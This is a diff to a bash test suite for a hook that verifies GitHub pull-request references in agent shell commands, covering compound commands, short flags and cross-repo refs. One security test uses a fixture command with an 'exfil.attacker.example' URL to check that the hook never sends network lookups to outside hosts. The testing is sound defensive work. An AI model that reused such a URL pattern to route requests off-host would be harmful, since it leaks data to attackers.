@@ -57,6 +57,23 @@ assert_silent() {
   fi
 }
 
+# Negative assertion — REQUIRED alongside the WARNING assertions below. A test that only
+# checks for "could not verify" cannot distinguish "the extractor correctly returned empty"
+# from "the extractor returned a WRONG ref that then failed lookup", because a stub that
+# rejects the wrong ref produces the same WARNING either way. Pairing each WARNING with a
+# not-contains on the ref the bug WOULD have produced is what makes these tests mutation-
+# sensitive (2026-08-05 round-3 review: reverting a fix left the suite byte-identical).
+assert_not_contains() {
+  local name="$1" needle="$2" out="$3"
+  if grep -qF "$needle" <<<"$out"; then
+    echo "FAIL: $name (unexpected substring present: $needle)"
+    printf '  got: %s\n' "$(printf '%s' "$out" | head -3)"
+    FAIL=$((FAIL+1))
+  else
+    echo "PASS: $name"; PASS=$((PASS+1))
+  fi
+}
+
 # Test 1: gh pr create, gh succeeds → verified message with PR number
 OUT=$(run_hook "gh pr create --title 'foo' --body 'bar'" "success")
 assert_contains "gh pr create + gh succeeds: PR verified message" "PR state verified" "$OUT"
@@ -240,14 +257,16 @@ rm -rf "$NOARGS_DIR"
 OUT=$(run_hook_reflect_ref "gh pr edit --add-label bug 42")
 assert_contains "value-flag-before-ref: ref resolves past the flag's own value" "ref=42" "$OUT"
 
-# Test 20: a compound command chaining two DIFFERENT gh-pr write subcommands
-# (`gh pr merge 42 && gh pr close some-branch`) must report the ref for the SAME
-# invocation `cmd_gh_pr_write_subcommand` read SUBCOMMAND from (both now pick the FIRST
-# match) — not independently pick a later, unrelated sub-invocation's ref. Caught in code
-# review: before this fix, SUBCOMMAND (first-match) and PR_REF (last-match) could describe
-# two different clauses of the same compound command.
+# Test 20: a compound command chaining two gh-pr write subcommands must NOT be answered at
+# all. Taking the first match of each extractor was not sufficient: a first match that is
+# then REJECTED is never retried against the next occurrence, so
+# `gh pr close --delete-branch && gh pr merge 42` paired clause 1's SUBCOMMAND with clause
+# 2's REF and reported them as a single invocation. cmd_gh_pr_ref now returns empty when
+# the bare text holds more than one `gh pr <merge|close|edit>` occurrence — failing to
+# "could not verify" rather than pairing across clauses at all.
 OUT=$(run_hook_reflect_ref "gh pr merge 42 && gh pr close some-branch")
-assert_contains "compound command: ref matches the FIRST (merge) subcommand, not the second" "ref=42" "$OUT"
+assert_contains "compound (both clauses have refs): could-not-verify, never a cross-clause pair" "WARNING: could not verify" "$OUT"
+assert_not_contains "compound (both clauses have refs): clause-2 ref never forwarded" "ref=some-branch" "$OUT"
 
 # Test 21: a VALUE-taking flag as the ENTIRE tail, with no positional ref at all
 # (`gh pr edit --milestone 5`) must emit the could-not-verify WARNING, never resolve "5" as
@@ -258,19 +277,125 @@ assert_contains "compound command: ref matches the FIRST (merge) subcommand, not
 # token is itself a known value-flag name. This is a realistic, common invocation shape
 # (operating implicitly on the current branch's PR while also setting a field), and a
 # milestone/label/comment value can easily coincide with a real PR number.
-NOARGS_DIR2=$(mktemp -d)
-cat > "$NOARGS_DIR2/gh" <<'GHEOF'
-#!/usr/bin/env bash
-case "${3:-}" in
-  ""|-*) echo '{"number":7,"url":"u","state":"OPEN","title":"WRONG - flag value mistaken for PR number"}' ;;
-  *) exit 1 ;;
-esac
-GHEOF
-chmod +x "$NOARGS_DIR2/gh"
-OUT=$(printf '{"tool_name":"Bash","tool_input":{"command":"gh pr edit --milestone 5"}}' \
-      | PATH="$NOARGS_DIR2:$PATH" bash "$HOOK" 2>/dev/null)
+#
+# Rewritten 2026-08-05 (round-3 review) onto run_hook_reflect_ref. The original used a stub
+# that exited non-zero for ANY non-flag $3, so "correctly returned empty" and "wrongly
+# returned 5, which then failed lookup" produced BYTE-IDENTICAL output — reverting the fix
+# left this test green. The reflecting stub SUCCEEDS on whatever ref it is handed, so a
+# regression surfaces as `ref=5` in the verified message instead of the WARNING.
+OUT=$(run_hook_reflect_ref "gh pr edit --milestone 5")
 assert_contains "value-flag-only tail: WARNING, never mistakes the flag's value for a PR ref" "WARNING: could not verify" "$OUT"
-rm -rf "$NOARGS_DIR2"
+assert_not_contains "value-flag-only tail: the flag's value never reaches gh as a ref" "ref=5" "$OUT"
+
+# Test 22: `--repo`/`-R` retargets ANOTHER repository, but the extractor has a single return
+# channel and pr-verify.sh calls `gh pr view` with no --repo — so a forwarded ref would be
+# resolved against the CURRENT repo. `gh pr merge --repo other-org/other-repo 42` would
+# confidently report the LOCAL #42, an unrelated PR, under the "trust these values"
+# framing — strictly worse than the numeric-only predecessor, which returned empty here.
+# Both spellings must now degrade to could-not-verify.
+OUT=$(run_hook_reflect_ref "gh pr merge --repo other-org/other-repo 42")
+assert_contains "--repo long form: could-not-verify, never a cross-repo number collision" "WARNING: could not verify" "$OUT"
+assert_not_contains "--repo long form: the ref is never resolved in the local repo" "ref=42" "$OUT"
+
+OUT=$(run_hook_reflect_ref "gh pr merge -R other-org/other-repo 42")
+assert_contains "-R short form: could-not-verify" "WARNING: could not verify" "$OUT"
+assert_not_contains "-R short form: the repo VALUE is never mistaken for the ref" "ref=other-org/other-repo" "$OUT"
+
+# Test 23 (SECURITY): cmd_gh_pr_write_subcommand matches MENTIONS, not invocations. That was
+# acceptable while a false positive cost one LOCAL `gh pr view`; once the ref could be a URL,
+# inert command TEXT could aim the lookup at any host. The trigger below is a shell COMMENT —
+# it does nothing when the user runs it, and cmd_bare strips quotes, not comments — yet the
+# hook performed the network I/O on its behalf. This stub RECORDS its argv, so the assertion
+# is on whether `gh` was invoked at all, not merely on what the message said.
+run_hook_record_argv() {
+  local cmd="$1" log="$2"
+  local dir out
+  dir=$(mktemp -d)
+  cat > "$dir/gh" <<GHEOF
+#!/usr/bin/env bash
+printf '%s\n' "\$*" >> "$log"
+printf '{"number":99,"url":"u","state":"OPEN","title":"CALLED"}\n'
+GHEOF
+  chmod +x "$dir/gh"
+  out=$(printf '{"tool_name":"Bash","tool_input":{"command":%s}}' "$(jq -Rn --arg c "$cmd" '$c')" \
+        | PATH="$dir:$PATH" bash "$HOOK" 2>/dev/null)
+  rm -rf "$dir"
+  printf '%s' "$out"
+}
+
+EGRESS_LOG=$(mktemp)
+OUT=$(run_hook_record_argv 'npm run something # gh pr merge https://exfil.attacker.example/o/r/pull/1' "$EGRESS_LOG")
+assert_not_contains "URL ref on a non-github host NEVER reaches gh argv" "exfil.attacker.example" "$(cat "$EGRESS_LOG")"
+assert_contains "URL ref on a non-github host: could-not-verify" "WARNING: could not verify" "$OUT"
+rm -f "$EGRESS_LOG"
+
+# Control for the test above: proves the argv recorder actually records, so the assertion
+# there cannot pass vacuously — and that the github.com allow-path still forwards normally.
+ALLOW_LOG=$(mktemp)
+OUT=$(run_hook_record_argv 'gh pr merge https://github.com/o/r/pull/42' "$ALLOW_LOG")
+assert_contains "recorder control: a github.com URL DOES reach gh argv" "https://github.com/o/r/pull/42" "$(cat "$ALLOW_LOG")"
+rm -f "$ALLOW_LOG"
+
+# Test 24: short-form VALUE-taking flags. `value_flags` and the post-hoc `prev` check
+# covered long names only, so the flag's own VALUE was resolved as the ref. Most such values
+# degrade to a failed lookup, but a numeric or real-branch value resolves a DIFFERENT REAL
+# PR — the exact defect this hook exists to prevent. `-A -b -F -t -c -B` are value-taking
+# everywhere they appear across `gh pr merge|close|edit` (gh 2.95.0) and boolean nowhere.
+OUT=$(run_hook_reflect_ref "gh pr merge -b message 42")
+assert_contains "-b (value-taking): could-not-verify" "WARNING: could not verify" "$OUT"
+assert_not_contains "-b (value-taking): the flag's value is never the ref" "ref=message" "$OUT"
+
+OUT=$(run_hook_reflect_ref "gh pr edit -B main 753")
+assert_contains "-B (value-taking): could-not-verify" "WARNING: could not verify" "$OUT"
+assert_not_contains "-B (value-taking): a real BRANCH value never resolves another PR" "ref=main" "$OUT"
+
+OUT=$(run_hook_reflect_ref "gh pr merge -t subject 42")
+assert_not_contains "-t (value-taking): the flag's value is never the ref" "ref=subject" "$OUT"
+
+# Test 25: the BOOLEAN short flags must keep resolving the ref — the fix above adds the
+# value-taking short forms to the `prev` rejection list ONLY, deliberately not to the regex
+# alternation, precisely so the boolean single-token skip path is preserved.
+OUT=$(run_hook_reflect_ref "gh pr merge -s 42")
+assert_contains "-s (boolean): ref still resolves past the flag" "ref=42" "$OUT"
+OUT=$(run_hook_reflect_ref "gh pr merge -d 42")
+assert_contains "-d (boolean): ref still resolves past the flag" "ref=42" "$OUT"
+
+# Test 26: the compound-clause shape the multi-occurrence guard exists for — clause 1
+# supplies SUBCOMMAND (close), clause 2 supplies the only ref (42). Reporting them together
+# describes an invocation that never happened.
+OUT=$(run_hook_reflect_ref "gh pr close --delete-branch && gh pr merge 42")
+assert_contains "compound (subcommand in clause 1, ref in clause 2): could-not-verify" "WARNING: could not verify" "$OUT"
+assert_not_contains "compound: clause-2 ref never paired with clause-1 subcommand" "ref=42" "$OUT"
+
+# Test 27: the two-clause shape with NO ref anywhere must also warn (not fall through to the
+# no-args current-branch lookup).
+OUT=$(run_hook_reflect_ref "gh pr close --delete-branch && gh pr merge")
+assert_contains "compound with no ref at all: could-not-verify" "WARNING: could not verify" "$OUT"
+assert_not_contains "compound with no ref: never the no-args current-branch fallback" "NOARG" "$OUT"
+
+# Test 28: the `#` strip must not re-open dash-leading tokens the regex's first-char class
+# excludes — `gh pr merge #-w` would otherwise reach `gh pr view` as the FLAG `-w`.
+OUT=$(run_hook_reflect_ref "gh pr merge #-w")
+assert_contains "dash-leading ref after the # strip: could-not-verify" "WARNING: could not verify" "$OUT"
+assert_not_contains "dash-leading ref after the # strip: never forwarded as a flag" "ref=-w" "$OUT"
+
+# Test 29: command-position anchor on cmd_gh_pr_ref itself. Unreachable through the hook —
+# cmd_gh_pr_write_subcommand is anchored too, so `foogh pr merge 42` yields no SUBCOMMAND and
+# the hook exits first — but cmd_gh_pr_ref is a fresh export in a lib seven hooks source, so
+# assert the anchor at the level where a future caller would actually hit it.
+. "$(cd "$(dirname "$HOOK")" && pwd)/lib/cmd-detect.sh"
+assert_ref_empty() {
+  local name="$1" cmd="$2" got
+  got=$(cmd_gh_pr_ref "$cmd")
+  if [ -z "$got" ]; then
+    echo "PASS: $name"; PASS=$((PASS+1))
+  else
+    echo "FAIL: $name (expected empty ref, got: $got)"; FAIL=$((FAIL+1))
+  fi
+}
+assert_ref_empty "cmd_gh_pr_ref is command-position anchored (foogh pr merge 42)" "foogh pr merge 42"
+assert_ref_empty "cmd_gh_pr_ref rejects --repo=owner/repo spelling" "gh pr merge --repo=o/r 42"
+assert_ref_empty "cmd_gh_pr_ref rejects -Rowner/repo spelling" "gh pr merge -Ro/r 42"
 
 echo ""
 echo "Results: $PASS passed, $FAIL failed"
